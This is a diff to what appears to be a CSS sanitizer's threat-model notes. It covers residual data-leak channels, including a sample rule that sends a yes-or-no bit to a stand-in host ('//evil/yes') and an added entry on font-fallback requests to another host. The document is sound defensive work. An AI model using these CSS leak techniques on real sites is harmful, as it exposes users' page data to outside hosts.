@@ -94,6 +94,10 @@ author could do; none of them runs script in a browser.
 - **An exact-match selector guess.** `input[value="admin"] { background: url(//evil/yes) }`
   leaks one yes or no per guess. Accepted as impractical against a token; the substring
   selectors that leak one character at a time are refused.
+- **A web font after a system font.** With `font-family: Arial, f` and an `@font-face` that
+  loads `f` from another host, a browser downloads `f` only when the text has a character
+  Arial lacks, so the request says yes or no for that element. Accepted for the same reason
+  as the guess above; `unicode-range`, which tests one character at a time, is refused.
 - **Content size.** No limit; time grows with the size and nothing else (every scan over content
   is linear, and a regex that reaches the PCRE limit refuses the block instead of passing it),
   except for the attribute names below. Cap it at the form or the API.
